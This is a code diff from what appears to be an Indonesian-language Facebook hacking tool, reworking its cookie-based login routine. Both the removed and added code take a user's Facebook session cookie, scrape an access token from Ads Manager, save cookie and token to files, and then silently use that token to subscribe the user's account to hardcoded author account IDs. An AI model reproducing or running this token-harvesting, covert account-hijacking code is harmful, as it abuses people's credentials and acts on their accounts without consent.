@@ -81,93 +81,26 @@ def banner():
 	print (' \033[1;96m  ____________________________________________')
 	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
 	
-#--- LOGIN TOKEN
-def loginCOK(self,kukis,ses):
-	try: 
-		# token EAAB
+# METHODE LOGIN
+def login():
+	try:
+		ses = requests.Session()
+		logo()
+		kukis = input(f'\n{P} Masukan \x1b[1;96mCOOKIE \x1b[1;97manda :{K} ')
 		url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
 		ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
 		con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
 		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
-		# token EAAG
-		url_tokG = ses.get(f'https://{self.business}/business_locations', cookies = {"cookie":kukis})
-		tokenG = re.search("(EAAG\w+)", url_tokG.text).group(1)
-		tulis(Panel(f"{Te}{O}Token EAAB{M}: {K}{tokenB}\n{O}Token EAAG{M}: {K}{tokenG}",title = f'{Te}{M}[ {H}AccessToken {M}]',style='#FF0022'));jeda(2)
-		romz1 = '100067807565861'
-		romz2 = '100029143111567'
-		romz3 = '100028434880529'
-		requests.post(
-			f"https://graph.facebook.com/{romz1}/subscribers?access_token={tokenB}",
-			cookies={"cookie":kukis}
-		).json()
-		requests.post(
-			f"https://graph.facebook.com/{romz2}/subscribers?access_token={tokenB}",
-			cookies={"cookie":kukis}
-		).json()
-		requests.post(
-			f"https://graph.facebook.com/{romz3}/subscribers?access_token={tokenB}",
-			cookies={"cookie":kukis}
-		).json()
+		open('data/token.txt','w').write(tokenB)
 		open('data/cookie.txt','w').write(kukis)
-		open('data/token_eaab.txt','w').write(tokenB)
-		open('data/token_eaag.txt','w').write(tokenG)
-		ikutt(kukis).guweh()
-	except (KeyError):
-		exit ("%s╰─%s cookie invalid "%(p,m));jeda(2)
-	except (IOError):
-		exit ("%s╰─%s login gagal, periksa cookies anda "%(p,m));jeda(2)
-	except (AttributeError) as ee:
-		print(f"{m}× {o}Token tidak dapat di akses, akun terkena spam. ");jeda(3)
-		self.loginSCRAP(kukis,ses)
-		#exit ("%s╰─%s terjadi kesalahan, periksa cookies anda %s"%(p,m,ee));jeda(2)
-	except requests.exceptions.ConnectionError:
-		exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
-	
-#--- CONVERT COOKIE DICT TO STRING
-def romz_xyz(self,cookie,venom={}):
-	for x in cookie.replace(' ','').strip().split(';'):
-		kuki = x.split('=')
-		if len(kuki) > 1:
-			venom.update({kuki[0]: kuki[1]})
-	return venom 
-	
-#--- UBAH BAHASA
-def ubah_bahasa(self,cookie,ses):
-	try:
-		url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
-		parsing = parser(url.text,"html.parser")
-		for x in parsing.find_all("form",{"method":"post"}):
-			if "Bahasa Indonesia" in str(x):
-				data = {
-					"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
-					"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
-						"submit"  : "Bahasa Indonesia"
-				}
-				post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
-	except:
-		pass 
-			
-#--- LOGIN COOKIES 
-def login():
-	try:
-		cek=ses.get("https://mbasic.facebook.com/profile.php?v=info",cookies=self.romz_xyz(kukis)).text 
-		if "mbasic_logout_button" in cek:
-			open('data/cookie.txt','w').write(kukis)
-			open('data/token_eaab.txt','w').write("accessTokenNotFound")
-			open('data/token_eaag.txt','w').write("accessTokenNotFound")
-			self.jalan(f"\n{p}•─ {o}Hi, welcome {h}"+re.findall("\<title\>(.*?)<\/title\>",cek)[0])
-			if "Laporkan Masalah" in cek:
-				self.ubah_bahasa(kukis,ses)
-				ikutt(kukis).guweh()
-			else:
-				self.ubah_bahasa(kukis,ses)
-				ikutt(kukis).guweh()
-		elif "checkpoint" in cek:
-			exit(f"\n{M}× account checkpoint{P}")
-		else:
-			exit(f"\n{M}× cookies invalid{P}")
-	except Exception as ee:
-		exit(f"\n{M}× {ee}{P}")
+		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
+		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
+		print (f"\n{H} √ login berhasil");jeda(2)
+		menu()
+	except Exception as e:
+		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
+		print(e)
+		exit()
 #  MENU
 def menu():
 	try:
